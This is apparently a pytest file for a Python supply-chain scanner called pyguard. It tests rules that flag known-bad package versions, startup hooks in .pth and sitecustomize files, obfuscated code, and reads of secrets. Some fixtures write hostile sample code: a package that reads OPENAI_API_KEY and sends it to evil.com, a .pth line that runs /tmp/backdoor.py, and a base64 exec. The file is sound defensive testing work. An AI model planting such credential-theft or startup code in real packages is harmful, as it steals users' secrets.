"""Tests for detection rules."""

from __future__ import annotations

from pathlib import Path
from unittest.mock import patch

from pyguard.environment import InstalledPackage, EnvironmentInfo
from pyguard.rules import (
    Severity,
    rule_known_bad_version,
    rule_pth_startup,
    rule_toplevel_secret_network,
    rule_obfuscation,
    rule_secret_plus_network,
    rule_secret_access,
    check_startup_hooks,
)


def make_env(**kwargs) -> EnvironmentInfo:
    defaults = dict(
        python_executable="/usr/bin/python3",
        site_packages=[],
        packages=[],
        pth_files=[],
        sitecustomize=None,
        usercustomize=None,
    )
    defaults.update(kwargs)
    return EnvironmentInfo(**defaults)


def make_pkg(name="testpkg", version="1.0.0") -> InstalledPackage:
    return InstalledPackage(name=name, version=version, location=Path("/fake"))


# ---------------------------------------------------------------------------
# known_bad_version
# ---------------------------------------------------------------------------

class TestKnownBadVersion:
    def test_detects_known_bad(self):
        pkg = make_pkg(name="litellm", version="1.82.8")
        findings = rule_known_bad_version(pkg, make_env())
        assert len(findings) == 1
        assert findings[0].severity == Severity.HIGH
        assert "1.82.8" in findings[0].message

    def test_clean_version(self):
        pkg = make_pkg(name="litellm", version="1.83.0")
        findings = rule_known_bad_version(pkg, make_env())
        assert findings == []

    def test_unknown_package(self):
        pkg = make_pkg(name="requests", version="2.31.0")
        findings = rule_known_bad_version(pkg, make_env())
        assert findings == []


# ---------------------------------------------------------------------------
# pth_startup
# ---------------------------------------------------------------------------

class TestPthStartup:
    def test_detects_executable_pth(self, tmp_path):
        pth = tmp_path / "testpkg.pth"
        pth.write_text("import malicious_module\n")
        pkg = make_pkg(name="testpkg")
        env = make_env(pth_files=[pth])
        findings = rule_pth_startup(pkg, env)
        assert len(findings) == 1
        assert findings[0].severity == Severity.HIGH

    def test_clean_pth(self, tmp_path):
        pth = tmp_path / "testpkg.pth"
        pth.write_text("/usr/lib/python3/dist-packages\n")
        pkg = make_pkg(name="testpkg")
        env = make_env(pth_files=[pth])
        findings = rule_pth_startup(pkg, env)
        assert findings == []

    def test_exec_in_pth(self, tmp_path):
        pth = tmp_path / "testpkg.pth"
        pth.write_text("exec(open('/tmp/backdoor.py').read())\n")
        pkg = make_pkg(name="testpkg")
        env = make_env(pth_files=[pth])
        findings = rule_pth_startup(pkg, env)
        assert len(findings) == 1

    def test_unrelated_pth_ignored(self, tmp_path):
        pth = tmp_path / "otherpkg.pth"
        pth.write_text("import evil\n")
        pkg = make_pkg(name="testpkg")
        env = make_env(pth_files=[pth])
        findings = rule_pth_startup(pkg, env)
        assert findings == []


# ---------------------------------------------------------------------------
# check_startup_hooks
# ---------------------------------------------------------------------------

class TestStartupHooks:
    def test_detects_sitecustomize(self, tmp_path):
        sc = tmp_path / "sitecustomize.py"
        sc.write_text("# malicious")
        env = make_env(sitecustomize=sc)
        findings = check_startup_hooks(env)
        assert any("sitecustomize" in f.message for f in findings)
        assert all(f.severity == Severity.HIGH for f in findings)

    def test_detects_usercustomize(self, tmp_path):
        uc = tmp_path / "usercustomize.py"
        uc.write_text("# malicious")
        env = make_env(usercustomize=uc)
        findings = check_startup_hooks(env)
        assert any("usercustomize" in f.message for f in findings)

    def test_clean_env(self):
        env = make_env()
        findings = check_startup_hooks(env)
        assert findings == []


# ---------------------------------------------------------------------------
# toplevel_secret_network (AST-based HIGH rule)
# ---------------------------------------------------------------------------

class TestToplevelSecretNetwork:
    def test_detects_toplevel_exfil(self, tmp_path):
        pkg_dir = tmp_path / "testpkg"
        pkg_dir.mkdir()
        # Top-level code: reads secret and posts immediately
        (pkg_dir / "__init__.py").write_text(
            "import os\nimport urllib.request\n"
            "key = os.environ.get('OPENAI_API_KEY')\n"
            "urllib.request.urlopen('http://evil.com/?k=' + key)\n"
        )
        pkg = make_pkg(name="testpkg")
        with patch("pyguard.rules.get_package_directory", return_value=pkg_dir):
            findings = rule_toplevel_secret_network(pkg, make_env())
        assert len(findings) >= 1
        assert findings[0].severity == Severity.HIGH

    def test_ignores_function_level_code(self, tmp_path):
        pkg_dir = tmp_path / "testpkg"
        pkg_dir.mkdir()
        # Same operations but inside a function — legitimate pattern
        (pkg_dir / "__init__.py").write_text(
            "import os, requests\n"
            "def upload(data):\n"
            "    key = os.environ.get('AWS_SECRET_ACCESS_KEY')\n"
            "    requests.post('https://s3.amazonaws.com', data=data)\n"
        )
        pkg = make_pkg(name="testpkg")
        with patch("pyguard.rules.get_package_directory", return_value=pkg_dir):
            findings = rule_toplevel_secret_network(pkg, make_env())
        assert findings == []

    def test_whitelisted_package_skipped(self, tmp_path):
        pkg_dir = tmp_path / "requests"
        pkg_dir.mkdir()
        (pkg_dir / "__init__.py").write_text(
            "import os\nkey = os.environ.get('X')\n"
        )
        pkg = make_pkg(name="requests")
        with patch("pyguard.rules.get_package_directory", return_value=pkg_dir):
            findings = rule_toplevel_secret_network(pkg, make_env())
        assert findings == []


# ---------------------------------------------------------------------------
# obfuscation
# ---------------------------------------------------------------------------

class TestObfuscation:
    def test_detects_base64_exec(self, tmp_path):
        pkg_dir = tmp_path / "testpkg"
        pkg_dir.mkdir()
        (pkg_dir / "__init__.py").write_text(
            "import base64\nexec(base64.b64decode('aW1wb3J0IG9z'))\n"
        )
        pkg = make_pkg(name="testpkg")
        with patch("pyguard.rules.get_package_directory", return_value=pkg_dir):
            findings = rule_obfuscation(pkg, make_env())
        assert len(findings) == 1
        assert findings[0].severity == Severity.HIGH

    def test_clean_package(self, tmp_path):
        pkg_dir = tmp_path / "testpkg"
        pkg_dir.mkdir()
        (pkg_dir / "__init__.py").write_text("def add(a, b): return a + b\n")
        pkg = make_pkg(name="testpkg")
        with patch("pyguard.rules.get_package_directory", return_value=pkg_dir):
            findings = rule_obfuscation(pkg, make_env())
        assert findings == []


# ---------------------------------------------------------------------------
# secret_plus_network (now MEDIUM)
# ---------------------------------------------------------------------------

class TestSecretPlusNetwork:
    def test_detects_combo(self, tmp_path):
        pkg_dir = tmp_path / "testpkg"
        pkg_dir.mkdir()
        (pkg_dir / "__init__.py").write_text("")
        (pkg_dir / "evil.py").write_text(
            "import os\nkey = os.environ['OPENAI_API_KEY']\n"
            "import urllib.request\nurllib.request.urlopen('http://evil.com/?k=' + key)\n"
        )
        pkg = make_pkg(name="testpkg")
        with patch("pyguard.rules.get_package_directory", return_value=pkg_dir):
            findings = rule_secret_plus_network(pkg, make_env())
        assert len(findings) >= 1
        assert findings[0].severity == Severity.MEDIUM

    def test_whitelisted_package_skipped(self, tmp_path):
        pkg_dir = tmp_path / "requests"
        pkg_dir.mkdir()
        (pkg_dir / "sessions.py").write_text(
            "import os\nkey = os.environ.get('X')\n"
            "def send(req):\n    req.post('https://example.com')\n"
        )
        pkg = make_pkg(name="requests")
        with patch("pyguard.rules.get_package_directory", return_value=pkg_dir):
            findings = rule_secret_plus_network(pkg, make_env())
        assert findings == []

    def test_no_package_dir(self):
        pkg = make_pkg(name="testpkg")
        with patch("pyguard.rules.get_package_directory", return_value=None):
            findings = rule_secret_plus_network(pkg, make_env())
        assert findings == []


# ---------------------------------------------------------------------------
# secret_access (now LOW)
# ---------------------------------------------------------------------------

class TestSecretAccess:
    def test_detects_env_access(self, tmp_path):
        pkg_dir = tmp_path / "testpkg"
        pkg_dir.mkdir()
        (pkg_dir / "__init__.py").write_text(
            "import os\nkey = os.environ.get('AWS_SECRET_ACCESS_KEY')\n"
        )
        pkg = make_pkg(name="testpkg")
        with patch("pyguard.rules.get_package_directory", return_value=pkg_dir):
            findings = rule_secret_access(pkg, make_env())
        assert len(findings) == 1
        assert findings[0].severity == Severity.LOW

    def test_clean_package(self, tmp_path):
        pkg_dir = tmp_path / "testpkg"
        pkg_dir.mkdir()
        (pkg_dir / "__init__.py").write_text("def add(a, b): return a + b\n")
        pkg = make_pkg(name="testpkg")
        with patch("pyguard.rules.get_package_directory", return_value=pkg_dir):
            findings = rule_secret_access(pkg, make_env())
        assert findings == []
